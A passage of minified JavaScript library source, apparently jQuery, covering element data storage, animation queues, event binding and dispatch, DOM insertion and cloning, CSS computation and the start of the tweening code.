}catch(e){}O.set(a,b,c)}else c=void 0;return c}n.extend({hasData:function(a){return O.hasData(a)||N.hasData(a)},data:function(a,b,c){return O.access(a,b,c)},removeData:function(a,b){O.remove(a,b)},_data:function(a,b,c){return N.access(a,b,c)},_removeData:function(a,b){N.remove(a,b)}}),n.fn.extend({data:function(a,b){var c,d,e,f=this[0],g=f&&f.attributes;if(void 0===a){if(this.length&&(e=O.get(f),1===f.nodeType&&!N.get(f,"hasDataAttrs"))){c=g.length;while(c--)g[c]&&(d=g[c].name,0===d.indexOf("data-")&&(d=n.camelCase(d.slice(5)),R(f,d,e[d])));N.set(f,"hasDataAttrs",!0)}return e}return"object"==typeof a?this.each(function(){O.set(this,a)}):K(this,function(b){var c,d;if(f&&void 0===b){if(c=O.get(f,a)||O.get(f,a.replace(Q,"-$&").toLowerCase()),void 0!==c)return c;if(d=n.camelCase(a),c=O.get(f,d),void 0!==c)return c;if(c=R(f,d,void 0),void 0!==c)return c}else d=n.camelCase(a),this.each(function(){var c=O.get(this,d);O.set(this,d,b),a.indexOf("-")>-1&&void 0!==c&&O.set(this,a,b)})},null,b,arguments.length>1,null,!0)},removeData:function(a){return this.each(function(){O.remove(this,a)})}}),n.extend({queue:function(a,b,c){var d;return a?(b=(b||"fx")+"queue",d=N.get(a,b),c&&(!d||n.isArray(c)?d=N.access(a,b,n.makeArray(c)):d.push(c)),d||[]):void 0},dequeue:function(a,b){b=b||"fx";var c=n.queue(a,b),d=c.length,e=c.shift(),f=n._queueHooks(a,b),g=function(){n.dequeue(a,b)};"inprogress"===e&&(e=c.shift(),d--),e&&("fx"===b&&c.unshift("inprogress"),delete f.stop,e.call(a,g,f)),!d&&f&&f.empty.fire()},_queueHooks:function(a,b){var c=b+"queueHooks";return N.get(a,c)||N.access(a,c,{empty:n.Callbacks("once memory").add(function(){N.remove(a,[b+"queue",c])})})}}),n.fn.extend({queue:function(a,b){var c=2;return"string"!=typeof a&&(b=a,a="fx",c--),arguments.length<c?n.queue(this[0],a):void 0===b?this:this.each(function(){var c=n.queue(this,a,b);n._queueHooks(this,a),"fx"===a&&"inprogress"!==c[0]&&n.dequeue(this,a)})},dequeue:function(a){return this.each(function(){n.dequeue(this,a)})},clearQueue:function(a){return this.queue(a||"fx",[])},promise:function(a,b){var c,d=1,e=n.Deferred(),f=this,g=this.length,h=function(){--d||e.resolveWith(f,[f])};"string"!=typeof a&&(b=a,a=void 0),a=a||"fx";while(g--)c=N.get(f[g],a+"queueHooks"),c&&c.empty&&(d++,c.empty.add(h));return h(),e.promise(b)}});var S=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,T=new RegExp("^(?:([+-])=|)("+S+")([a-z%]*)$","i"),U=["Top","Right","Bottom","Left"],V=function(a,b){return a=b||a,"none"===n.css(a,"display")||!n.contains(a.ownerDocument,a)};function W(a,b,c,d){var e,f=1,g=20,h=d?function(){return d.cur()}:function(){return n.css(a,b,"")},i=h(),j=c&&c[3]||(n.cssNumber[b]?"":"px"),k=(n.cssNumber[b]||"px"!==j&&+i)&&T.exec(n.css(a,b));if(k&&k[3]!==j){j=j||k[3],c=c||[],k=+i||1;do f=f||".5",k/=f,n.style(a,b,k+j);while(f!==(f=h()/i)&&1!==f&&--g)}return c&&(k=+k||+i||0,e=c[1]?k+(c[1]+1)*c[2]:+c[2],d&&(d.unit=j,d.start=k,d.end=e)),e}var X=/^(?:checkbox|radio)$/i,Y=/<([\w:-]+)/,Z=/^$|\/(?:java|ecma)script/i,$={option:[1,"<select multiple='multiple'>","</select>"],thead:[1,"<table>","</table>"],col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};$.optgroup=$.option,$.tbody=$.tfoot=$.colgroup=$.caption=$.thead,$.th=$.td;function _(a,b){var c="undefined"!=typeof a.getElementsByTagName?a.getElementsByTagName(b||"*"):"undefined"!=typeof a.querySelectorAll?a.querySelectorAll(b||"*"):[];return void 0===b||b&&n.nodeName(a,b)?n.merge([a],c):c}function aa(a,b){for(var c=0,d=a.length;d>c;c++)N.set(a[c],"globalEval",!b||N.get(b[c],"globalEval"))}var ba=/<|&#?\w+;/;function ca(a,b,c,d,e){for(var f,g,h,i,j,k,l=b.createDocumentFragment(),m=[],o=0,p=a.length;p>o;o++)if(f=a[o],f||0===f)if("object"===n.type(f))n.merge(m,f.nodeType?[f]:f);else if(ba.test(f)){g=g||l.appendChild(b.createElement("div")),h=(Y.exec(f)||["",""])[1].toLowerCase(),i=$[h]||$._default,g.innerHTML=i[1]+n.htmlPrefilter(f)+i[2],k=i[0];while(k--)g=g.lastChild;n.merge(m,g.childNodes),g=l.firstChild,g.textContent=""}else m.push(b.createTextNode(f));l.textContent="",o=0;while(f=m[o++])if(d&&n.inArray(f,d)>-1)e&&e.push(f);else if(j=n.contains(f.ownerDocument,f),g=_(l.appendChild(f),"script"),j&&aa(g),c){k=0;while(f=g[k++])Z.test(f.type||"")&&c.push(f)}return l}!function(){var a=d.createDocumentFragment(),b=a.appendChild(d.createElement("div")),c=d.createElement("input");c.setAttribute("type","radio"),c.setAttribute("checked","checked"),c.setAttribute("name","t"),b.appendChild(c),l.checkClone=b.cloneNode(!0).cloneNode(!0).lastChild.checked,b.innerHTML="<textarea>x</textarea>",l.noCloneChecked=!!b.cloneNode(!0).lastChild.defaultValue}();var da=/^key/,ea=/^(?:mouse|pointer|contextmenu|drag|drop)|click/,fa=/^([^.]*)(?:\.(.+)|)/;function ga(){return!0}function ha(){return!1}function ia(){try{return d.activeElement}catch(a){}}function ja(a,b,c,d,e,f){var g,h;if("object"==typeof b){"string"!=typeof c&&(d=d||c,c=void 0);for(h in b)ja(a,h,c,d,b[h],f);return a}if(null==d&&null==e?(e=c,d=c=void 0):null==e&&("string"==typeof c?(e=d,d=void 0):(e=d,d=c,c=void 0)),e===!1)e=ha;else if(!e)return a;return 1===f&&(g=e,e=function(a){return n().off(a),g.apply(this,arguments)},e.guid=g.guid||(g.guid=n.guid++)),a.each(function(){n.event.add(this,b,e,d,c)})}n.event={global:{},add:function(a,b,c,d,e){var f,g,h,i,j,k,l,m,o,p,q,r=N.get(a);if(r){c.handler&&(f=c,c=f.handler,e=f.selector),c.guid||(c.guid=n.guid++),(i=r.events)||(i=r.events={}),(g=r.handle)||(g=r.handle=function(b){return"undefined"!=typeof n&&n.event.triggered!==b.type?n.event.dispatch.apply(a,arguments):void 0}),b=(b||"").match(G)||[""],j=b.length;while(j--)h=fa.exec(b[j])||[],o=q=h[1],p=(h[2]||"").split(".").sort(),o&&(l=n.event.special[o]||{},o=(e?l.delegateType:l.bindType)||o,l=n.event.special[o]||{},k=n.extend({type:o,origType:q,data:d,handler:c,guid:c.guid,selector:e,needsContext:e&&n.expr.match.needsContext.test(e),namespace:p.join(".")},f),(m=i[o])||(m=i[o]=[],m.delegateCount=0,l.setup&&l.setup.call(a,d,p,g)!==!1||a.addEventListener&&a.addEventListener(o,g)),l.add&&(l.add.call(a,k),k.handler.guid||(k.handler.guid=c.guid)),e?m.splice(m.delegateCount++,0,k):m.push(k),n.event.global[o]=!0)}},remove:function(a,b,c,d,e){var f,g,h,i,j,k,l,m,o,p,q,r=N.hasData(a)&&N.get(a);if(r&&(i=r.events)){b=(b||"").match(G)||[""],j=b.length;while(j--)if(h=fa.exec(b[j])||[],o=q=h[1],p=(h[2]||"").split(".").sort(),o){l=n.event.special[o]||{},o=(d?l.delegateType:l.bindType)||o,m=i[o]||[],h=h[2]&&new RegExp("(^|\\.)"+p.join("\\.(?:.*\\.|)")+"(\\.|$)"),g=f=m.length;while(f--)k=m[f],!e&&q!==k.origType||c&&c.guid!==k.guid||h&&!h.test(k.namespace)||d&&d!==k.selector&&("**"!==d||!k.selector)||(m.splice(f,1),k.selector&&m.delegateCount--,l.remove&&l.remove.call(a,k));g&&!m.length&&(l.teardown&&l.teardown.call(a,p,r.handle)!==!1||n.removeEvent(a,o,r.handle),delete i[o])}else for(o in i)n.event.remove(a,o+b[j],c,d,!0);n.isEmptyObject(i)&&N.remove(a,"handle events")}},dispatch:function(a){a=n.event.fix(a);var b,c,d,f,g,h=[],i=e.call(arguments),j=(N.get(this,"events")||{})[a.type]||[],k=n.event.special[a.type]||{};if(i[0]=a,a.delegateTarget=this,!k.preDispatch||k.preDispatch.call(this,a)!==!1){h=n.event.handlers.call(this,a,j),b=0;while((f=h[b++])&&!a.isPropagationStopped()){a.currentTarget=f.elem,c=0;while((g=f.handlers[c++])&&!a.isImmediatePropagationStopped())a.rnamespace&&!a.rnamespace.test(g.namespace)||(a.handleObj=g,a.data=g.data,d=((n.event.special[g.origType]||{}).handle||g.handler).apply(f.elem,i),void 0!==d&&(a.result=d)===!1&&(a.preventDefault(),a.stopPropagation()))}return k.postDispatch&&k.postDispatch.call(this,a),a.result}},handlers:function(a,b){var c,d,e,f,g=[],h=b.delegateCount,i=a.target;if(h&&i.nodeType&&("click"!==a.type||isNaN(a.button)||a.button<1))for(;i!==this;i=i.parentNode||this)if(1===i.nodeType&&(i.disabled!==!0||"click"!==a.type)){for(d=[],c=0;h>c;c++)f=b[c],e=f.selector+" ",void 0===d[e]&&(d[e]=f.needsContext?n(e,this).index(i)>-1:n.find(e,this,null,[i]).length),d[e]&&d.push(f);d.length&&g.push({elem:i,handlers:d})}return h<b.length&&g.push({elem:this,handlers:b.slice(h)}),g},props:"altKey bubbles cancelable ctrlKey currentTarget detail eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(a,b){return null==a.which&&(a.which=null!=b.charCode?b.charCode:b.keyCode),a}},mouseHooks:{props:"button buttons clientX clientY offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(a,b){var c,e,f,g=b.button;return null==a.pageX&&null!=b.clientX&&(c=a.target.ownerDocument||d,e=c.documentElement,f=c.body,a.pageX=b.clientX+(e&&e.scrollLeft||f&&f.scrollLeft||0)-(e&&e.clientLeft||f&&f.clientLeft||0),a.pageY=b.clientY+(e&&e.scrollTop||f&&f.scrollTop||0)-(e&&e.clientTop||f&&f.clientTop||0)),a.which||void 0===g||(a.which=1&g?1:2&g?3:4&g?2:0),a}},fix:function(a){if(a[n.expando])return a;var b,c,e,f=a.type,g=a,h=this.fixHooks[f];h||(this.fixHooks[f]=h=ea.test(f)?this.mouseHooks:da.test(f)?this.keyHooks:{}),e=h.props?this.props.concat(h.props):this.props,a=new n.Event(g),b=e.length;while(b--)c=e[b],a[c]=g[c];return a.target||(a.target=d),3===a.target.nodeType&&(a.target=a.target.parentNode),h.filter?h.filter(a,g):a},special:{load:{noBubble:!0},focus:{trigger:function(){return this!==ia()&&this.focus?(this.focus(),!1):void 0},delegateType:"focusin"},blur:{trigger:function(){return this===ia()&&this.blur?(this.blur(),!1):void 0},delegateType:"focusout"},click:{trigger:function(){return"checkbox"===this.type&&this.click&&n.nodeName(this,"input")?(this.click(),!1):void 0},_default:function(a){return n.nodeName(a.target,"a")}},beforeunload:{postDispatch:function(a){void 0!==a.result&&a.originalEvent&&(a.originalEvent.returnValue=a.result)}}}},n.removeEvent=function(a,b,c){a.removeEventListener&&a.removeEventListener(b,c)},n.Event=function(a,b){return this instanceof n.Event?(a&&a.type?(this.originalEvent=a,this.type=a.type,this.isDefaultPrevented=a.defaultPrevented||void 0===a.defaultPrevented&&a.returnValue===!1?ga:ha):this.type=a,b&&n.extend(this,b),this.timeStamp=a&&a.timeStamp||n.now(),void(this[n.expando]=!0)):new n.Event(a,b)},n.Event.prototype={constructor:n.Event,isDefaultPrevented:ha,isPropagationStopped:ha,isImmediatePropagationStopped:ha,preventDefault:function(){var a=this.originalEvent;this.isDefaultPrevented=ga,a&&a.preventDefault()},stopPropagation:function(){var a=this.originalEvent;this.isPropagationStopped=ga,a&&a.stopPropagation()},stopImmediatePropagation:function(){var a=this.originalEvent;this.isImmediatePropagationStopped=ga,a&&a.stopImmediatePropagation(),this.stopPropagation()}},n.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},function(a,b){n.event.special[a]={delegateType:b,bindType:b,handle:function(a){var c,d=this,e=a.relatedTarget,f=a.handleObj;return e&&(e===d||n.contains(d,e))||(a.type=f.origType,c=f.handler.apply(this,arguments),a.type=b),c}}}),n.fn.extend({on:function(a,b,c,d){return ja(this,a,b,c,d)},one:function(a,b,c,d){return ja(this,a,b,c,d,1)},off:function(a,b,c){var d,e;if(a&&a.preventDefault&&a.handleObj)return d=a.handleObj,n(a.delegateTarget).off(d.namespace?d.origType+"."+d.namespace:d.origType,d.selector,d.handler),this;if("object"==typeof a){for(e in a)this.off(e,b,a[e]);return this}return b!==!1&&"function"!=typeof b||(c=b,b=void 0),c===!1&&(c=ha),this.each(function(){n.event.remove(this,a,c,b)})}});var ka=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:-]+)[^>]*)\/>/gi,la=/<script|<style|<link/i,ma=/checked\s*(?:[^=]|=\s*.checked.)/i,na=/^true\/(.*)/,oa=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;function pa(a,b){return n.nodeName(a,"table")&&n.nodeName(11!==b.nodeType?b:b.firstChild,"tr")?a.getElementsByTagName("tbody")[0]||a.appendChild(a.ownerDocument.createElement("tbody")):a}function qa(a){return a.type=(null!==a.getAttribute("type"))+"/"+a.type,a}function ra(a){var b=na.exec(a.type);return b?a.type=b[1]:a.removeAttribute("type"),a}function sa(a,b){var c,d,e,f,g,h,i,j;if(1===b.nodeType){if(N.hasData(a)&&(f=N.access(a),g=N.set(b,f),j=f.events)){delete g.handle,g.events={};for(e in j)for(c=0,d=j[e].length;d>c;c++)n.event.add(b,e,j[e][c])}O.hasData(a)&&(h=O.access(a),i=n.extend({},h),O.set(b,i))}}function ta(a,b){var c=b.nodeName.toLowerCase();"input"===c&&X.test(a.type)?b.checked=a.checked:"input"!==c&&"textarea"!==c||(b.defaultValue=a.defaultValue)}function ua(a,b,c,d){b=f.apply([],b);var e,g,h,i,j,k,m=0,o=a.length,p=o-1,q=b[0],r=n.isFunction(q);if(r||o>1&&"string"==typeof q&&!l.checkClone&&ma.test(q))return a.each(function(e){var f=a.eq(e);r&&(b[0]=q.call(this,e,f.html())),ua(f,b,c,d)});if(o&&(e=ca(b,a[0].ownerDocument,!1,a,d),g=e.firstChild,1===e.childNodes.length&&(e=g),g||d)){for(h=n.map(_(e,"script"),qa),i=h.length;o>m;m++)j=e,m!==p&&(j=n.clone(j,!0,!0),i&&n.merge(h,_(j,"script"))),c.call(a[m],j,m);if(i)for(k=h[h.length-1].ownerDocument,n.map(h,ra),m=0;i>m;m++)j=h[m],Z.test(j.type||"")&&!N.access(j,"globalEval")&&n.contains(k,j)&&(j.src?n._evalUrl&&n._evalUrl(j.src):n.globalEval(j.textContent.replace(oa,"")))}return a}function va(a,b,c){for(var d,e=b?n.filter(b,a):a,f=0;null!=(d=e[f]);f++)c||1!==d.nodeType||n.cleanData(_(d)),d.parentNode&&(c&&n.contains(d.ownerDocument,d)&&aa(_(d,"script")),d.parentNode.removeChild(d));return a}n.extend({htmlPrefilter:function(a){return a.replace(ka,"<$1></$2>")},clone:function(a,b,c){var d,e,f,g,h=a.cloneNode(!0),i=n.contains(a.ownerDocument,a);if(!(l.noCloneChecked||1!==a.nodeType&&11!==a.nodeType||n.isXMLDoc(a)))for(g=_(h),f=_(a),d=0,e=f.length;e>d;d++)ta(f[d],g[d]);if(b)if(c)for(f=f||_(a),g=g||_(h),d=0,e=f.length;e>d;d++)sa(f[d],g[d]);else sa(a,h);return g=_(h,"script"),g.length>0&&aa(g,!i&&_(a,"script")),h},cleanData:function(a){for(var b,c,d,e=n.event.special,f=0;void 0!==(c=a[f]);f++)if(L(c)){if(b=c[N.expando]){if(b.events)for(d in b.events)e[d]?n.event.remove(c,d):n.removeEvent(c,d,b.handle);c[N.expando]=void 0}c[O.expando]&&(c[O.expando]=void 0)}}}),n.fn.extend({domManip:ua,detach:function(a){return va(this,a,!0)},remove:function(a){return va(this,a)},text:function(a){return K(this,function(a){return void 0===a?n.text(this):this.empty().each(function(){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||(this.textContent=a)})},null,a,arguments.length)},append:function(){return ua(this,arguments,function(a){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var b=pa(this,a);b.appendChild(a)}})},prepend:function(){return ua(this,arguments,function(a){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var b=pa(this,a);b.insertBefore(a,b.firstChild)}})},before:function(){return ua(this,arguments,function(a){this.parentNode&&this.parentNode.insertBefore(a,this)})},after:function(){return ua(this,arguments,function(a){this.parentNode&&this.parentNode.insertBefore(a,this.nextSibling)})},empty:function(){for(var a,b=0;null!=(a=this[b]);b++)1===a.nodeType&&(n.cleanData(_(a,!1)),a.textContent="");return this},clone:function(a,b){return a=null==a?!1:a,b=null==b?a:b,this.map(function(){return n.clone(this,a,b)})},html:function(a){return K(this,function(a){var b=this[0]||{},c=0,d=this.length;if(void 0===a&&1===b.nodeType)return b.innerHTML;if("string"==typeof a&&!la.test(a)&&!$[(Y.exec(a)||["",""])[1].toLowerCase()]){a=n.htmlPrefilter(a);try{for(;d>c;c++)b=this[c]||{},1===b.nodeType&&(n.cleanData(_(b,!1)),b.innerHTML=a);b=0}catch(e){}}b&&this.empty().append(a)},null,a,arguments.length)},replaceWith:function(){var a=[];return ua(this,arguments,function(b){var c=this.parentNode;n.inArray(this,a)<0&&(n.cleanData(_(this)),c&&c.replaceChild(b,this))},a)}}),n.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(a,b){n.fn[a]=function(a){for(var c,d=[],e=n(a),f=e.length-1,h=0;f>=h;h++)c=h===f?this:this.clone(!0),n(e[h])[b](c),g.apply(d,c.get());return this.pushStack(d)}});var wa,xa={HTML:"block",BODY:"block"};function ya(a,b){var c=n(b.createElement(a)).appendTo(b.body),d=n.css(c[0],"display");return c.detach(),d}function za(a){var b=d,c=xa[a];return c||(c=ya(a,b),"none"!==c&&c||(wa=(wa||n("<iframe frameborder='0' width='0' height='0'/>")).appendTo(b.documentElement),b=wa[0].contentDocument,b.write(),b.close(),c=ya(a,b),wa.detach()),xa[a]=c),c}var Aa=/^margin/,Ba=new RegExp("^("+S+")(?!px)[a-z%]+$","i"),Ca=function(b){var c=b.ownerDocument.defaultView;return c&&c.opener||(c=a),c.getComputedStyle(b)},Da=function(a,b,c,d){var e,f,g={};for(f in b)g[f]=a.style[f],a.style[f]=b[f];e=c.apply(a,d||[]);for(f in b)a.style[f]=g[f];return e},Ea=d.documentElement;!function(){var b,c,e,f,g=d.createElement("div"),h=d.createElement("div");if(h.style){h.style.backgroundClip="content-box",h.cloneNode(!0).style.backgroundClip="",l.clearCloneStyle="content-box"===h.style.backgroundClip,g.style.cssText="border:0;width:8px;height:0;top:0;left:-9999px;padding:0;margin-top:1px;position:absolute",g.appendChild(h);function i(){h.style.cssText="-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;position:relative;display:block;margin:auto;border:1px;padding:1px;top:1%;width:50%",h.innerHTML="",Ea.appendChild(g);var d=a.getComputedStyle(h);b="1%"!==d.top,f="2px"===d.marginLeft,c="4px"===d.width,h.style.marginRight="50%",e="4px"===d.marginRight,Ea.removeChild(g)}n.extend(l,{pixelPosition:function(){return i(),b},boxSizingReliable:function(){return null==c&&i(),c},pixelMarginRight:function(){return null==c&&i(),e},reliableMarginLeft:function(){return null==c&&i(),f},reliableMarginRight:function(){var b,c=h.appendChild(d.createElement("div"));return c.style.cssText=h.style.cssText="-webkit-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0",c.style.marginRight=c.style.width="0",h.style.width="1px",Ea.appendChild(g),b=!parseFloat(a.getComputedStyle(c).marginRight),Ea.removeChild(g),h.removeChild(c),b}})}}();function Fa(a,b,c){var d,e,f,g,h=a.style;return c=c||Ca(a),g=c?c.getPropertyValue(b)||c[b]:void 0,""!==g&&void 0!==g||n.contains(a.ownerDocument,a)||(g=n.style(a,b)),c&&!l.pixelMarginRight()&&Ba.test(g)&&Aa.test(b)&&(d=h.width,e=h.minWidth,f=h.maxWidth,h.minWidth=h.maxWidth=h.width=g,g=c.width,h.width=d,h.minWidth=e,h.maxWidth=f),void 0!==g?g+"":g}function Ga(a,b){return{get:function(){return a()?void delete this.get:(this.get=b).apply(this,arguments)}}}var Ha=/^(none|table(?!-c[ea]).+)/,Ia={position:"absolute",visibility:"hidden",display:"block"},Ja={letterSpacing:"0",fontWeight:"400"},Ka=["Webkit","O","Moz","ms"],La=d.createElement("div").style;function Ma(a){if(a in La)return a;var b=a[0].toUpperCase()+a.slice(1),c=Ka.length;while(c--)if(a=Ka[c]+b,a in La)return a}function Na(a,b,c){var d=T.exec(b);return d?Math.max(0,d[2]-(c||0))+(d[3]||"px"):b}function Oa(a,b,c,d,e){for(var f=c===(d?"border":"content")?4:"width"===b?1:0,g=0;4>f;f+=2)"margin"===c&&(g+=n.css(a,c+U[f],!0,e)),d?("content"===c&&(g-=n.css(a,"padding"+U[f],!0,e)),"margin"!==c&&(g-=n.css(a,"border"+U[f]+"Width",!0,e))):(g+=n.css(a,"padding"+U[f],!0,e),"padding"!==c&&(g+=n.css(a,"border"+U[f]+"Width",!0,e)));return g}function Pa(b,c,e){var f=!0,g="width"===c?b.offsetWidth:b.offsetHeight,h=Ca(b),i="border-box"===n.css(b,"boxSizing",!1,h);if(d.msFullscreenElement&&a.top!==a&&b.getClientRects().length&&(g=Math.round(100*b.getBoundingClientRect()[c])),0>=g||null==g){if(g=Fa(b,c,h),(0>g||null==g)&&(g=b.style[c]),Ba.test(g))return g;f=i&&(l.boxSizingReliable()||g===b.style[c]),g=parseFloat(g)||0}return g+Oa(b,c,e||(i?"border":"content"),f,h)+"px"}function Qa(a,b){for(var c,d,e,f=[],g=0,h=a.length;h>g;g++)d=a[g],d.style&&(f[g]=N.get(d,"olddisplay"),c=d.style.display,b?(f[g]||"none"!==c||(d.style.display=""),""===d.style.display&&V(d)&&(f[g]=N.access(d,"olddisplay",za(d.nodeName)))):(e=V(d),"none"===c&&e||N.set(d,"olddisplay",e?c:n.css(d,"display"))));for(g=0;h>g;g++)d=a[g],d.style&&(b&&"none"!==d.style.display&&""!==d.style.display||(d.style.display=b?f[g]||"":"none"));return a}n.extend({cssHooks:{opacity:{get:function(a,b){if(b){var c=Fa(a,"opacity");return""===c?"1":c}}}},cssNumber:{animationIterationCount:!0,columnCount:!0,fillOpacity:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{"float":"cssFloat"},style:function(a,b,c,d){if(a&&3!==a.nodeType&&8!==a.nodeType&&a.style){var e,f,g,h=n.camelCase(b),i=a.style;return b=n.cssProps[h]||(n.cssProps[h]=Ma(h)||h),g=n.cssHooks[b]||n.cssHooks[h],void 0===c?g&&"get"in g&&void 0!==(e=g.get(a,!1,d))?e:i[b]:(f=typeof c,"string"===f&&(e=T.exec(c))&&e[1]&&(c=W(a,b,e),f="number"),null!=c&&c===c&&("number"===f&&(c+=e&&e[3]||(n.cssNumber[h]?"":"px")),l.clearCloneStyle||""!==c||0!==b.indexOf("background")||(i[b]="inherit"),g&&"set"in g&&void 0===(c=g.set(a,c,d))||(i[b]=c)),void 0)}},css:function(a,b,c,d){var e,f,g,h=n.camelCase(b);return b=n.cssProps[h]||(n.cssProps[h]=Ma(h)||h),g=n.cssHooks[b]||n.cssHooks[h],g&&"get"in g&&(e=g.get(a,!0,c)),void 0===e&&(e=Fa(a,b,d)),"normal"===e&&b in Ja&&(e=Ja[b]),""===c||c?(f=parseFloat(e),c===!0||isFinite(f)?f||0:e):e}}),n.each(["height","width"],function(a,b){n.cssHooks[b]={get:function(a,c,d){return c?Ha.test(n.css(a,"display"))&&0===a.offsetWidth?Da(a,Ia,function(){return Pa(a,b,d)}):Pa(a,b,d):void 0},set:function(a,c,d){var e,f=d&&Ca(a),g=d&&Oa(a,b,d,"border-box"===n.css(a,"boxSizing",!1,f),f);return g&&(e=T.exec(c))&&"px"!==(e[3]||"px")&&(a.style[b]=c,c=n.css(a,b)),Na(a,c,g)}}}),n.cssHooks.marginLeft=Ga(l.reliableMarginLeft,function(a,b){return b?(parseFloat(Fa(a,"marginLeft"))||a.getBoundingClientRect().left-Da(a,{marginLeft:0},function(){return a.getBoundingClientRect().left}))+"px":void 0}),n.cssHooks.marginRight=Ga(l.reliableMarginRight,function(a,b){return b?Da(a,{display:"inline-block"},Fa,[a,"marginRight"]):void 0}),n.each({margin:"",padding:"",border:"Width"},function(a,b){n.cssHooks[a+b]={expand:function(c){for(var d=0,e={},f="string"==typeof c?c.split(" "):[c];4>d;d++)e[a+U[d]+b]=f[d]||f[d-2]||f[0];return e}},Aa.test(a)||(n.cssHooks[a+b].set=Na)}),n.fn.extend({css:function(a,b){return K(this,function(a,b,c){var d,e,f={},g=0;if(n.isArray(b)){for(d=Ca(a),e=b.length;e>g;g++)f[b[g]]=n.css(a,b[g],!1,d);return f}return void 0!==c?n.style(a,b,c):n.css(a,b)},a,b,arguments.length>1)},show:function(){return Qa(this,!0)},hide:function(){return Qa(this)},toggle:function(a){return"boolean"==typeof a?a?this.show():this.hide():this.each(function(){V(this)?n(this).show():n(this).hide()})}});function Ra(a,b,c,d,e){return new Ra.prototype.init(a,b,c,d,e)}n.Tween=Ra,Ra.prototype={constructor:Ra,init:function(a,b,c,d,e,f){this.elem=a,this.prop=c,this.easing=e||n.easing._default,this.options=b,this.start=this.now=this.cur(),this.end=d,this.unit=f||(n.cssNumber[c]?"":"px")},cur:function(){var a=Ra.propHooks[this.prop];return a&&a.get?a.get(this):Ra.propHooks._default.get(this)},run:function(a){var b,c=Ra.propHooks[this.prop];return this.options.duration?this.pos=b=n.easing[this.easing](a,this.options.duration*a,0,1,this.options.duration):this.pos=b=a,this.now=(this.end-this.start)*b+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),c&&c.set?c.set(this):Ra.propHooks._default.set(this),this}},Ra.prototype.init.prototype=Ra.prototype,Ra.propHooks={_default:{get:function(a){var b;return 1!==a.elem.nodeType||null!=a.elem[a.prop]&&null==a.elem.style[a.prop]?a.elem[a.prop]:(b=n.css(a.elem,a.prop,""),b&&"auto"!==b?b:0)},set:function(a){n.fx.step[a.prop]?n.fx.step[a.prop](a):1!==a.elem.nodeType||null==a.elem.style[n.cssProps[a.prop]]&&!n.cssHooks[a.prop]?a.elem[a.prop]=a.now:n.style(a.elem,a.prop,a.now+a.unit)}}},Ra.propHooks.scrollTop=Ra.propHooks.scrollLeft={set:function(a){a.elem.nodeType&&a.elem.parentNode&&(a.elem[a.prop]=a.now)}},n.easing={linear:function(a){return a},swing:function(a){return.5-Math.cos(a*Math.PI)/2},_default:"swing"},n.fx=Ra.prototype.init,n.fx.step={};var Sa,Ta,Ua=/^(?:toggle|show|hide)$/,Va=/queueHooks$/;function Wa(){return a.setTimeout(function(){Sa=void 0}),Sa=n.now()}function Xa(a,b){var c,d=0,e={height:a};for(b=b?1:0;4>d;d+=2-b)c=U[d],e["margin"+c]=e["padding"+c]=a;return b&&(e.opacity=e.width=a),e}function Ya(a,b,c){for(var d,e=(_a.tweeners[b]||[]).concat(_a.tweeners["*"]),f=0,g=e.length;g>f;f++)if(d=e[f].call(c,b,a))return d}function Za(a,b,c){var d,e,f,g,h,i,j,k,l=this,m={},o=a.style,p=a.nodeType&&V(a),q=N.get(a,"fxshow");c.queue||(h=n._queueHooks(a,"fx"),null==h.unqueued&&(h.unqueued=0,i=h.empty.fire,h.empty.fire=function(){h.unqueued||i()}),h.unqueued++,l.always(function(){l.always(function(){h.unqueued--,n.queue(a,"fx").length||h.empty.fire()})})),1===a.nodeType&&("height"in b||"width"in b)&&(c.overflow=[o.overflow,o.overflowX,o.overflowY],j=n.css(a,"display"),k="none"===j?N.get(a,"olddisplay")||za(a.nodeName):j,"inline"===k&&"none"===n.css(a,"float")&&(o.display="inline-block")),c.overflow&&(o.overflow="hidden",l.always(function(){o.overflow=c.overflow[0],o.overflowX=c.overflow[1],o.overflowY=c.overflow[2]}));for(d in b)if(e=b[d],Ua.exec(e)){if(delete b[d],f=f||"toggle"===e,e===(p?"hide":"show")){if("show"!==e||!q||void 0===q[d])continue;p=!0}m[d]=q&&q[d]||n.style(a,d)}else j=void 0;if(n.isEmptyObject(m))"inline"===("none"===j?za(a.nodeName):j)&&(o.display=j);else{q?"hidden"in q&&(p=q.hidden):q=N.access(a,"fxshow",{}),f&&(q.hidden=!p),p?n(a).show():l.done(function(){n(a).hide()}),l.done(function(){var b;N.remove(a,"fxshow");for(b in m)n.style(a,b,m[b])});for(d in m)g=Ya(p?q[d]:0,d,l),d in q||(q[d]=g.start,p&&(g.end=g.start,g.start="width"===d||"height"===d?1:0))}}function $a(a,b){var c,d,e,f,g;for(c in a)if(d=n.camelCase(c),e=b[d],f=a[c],n.isArray(f)&&(e=f[1],f=a[c]=f[0]),c!==d&&(a[d]=f,delete a[c]),g=n.cssHooks[d],g&&"expand"in g){f=g.expand(f),delete a[d];for(c in f)c in a||(a[c]=f[c],b[c]=e)}else b[d]=e}function _a(a,b,c){var d,e,f=0,g=_a.prefilters.length,h=n.Deferred().always(function(){delete i.elem}),i=function(){if(e)return!1;for(var 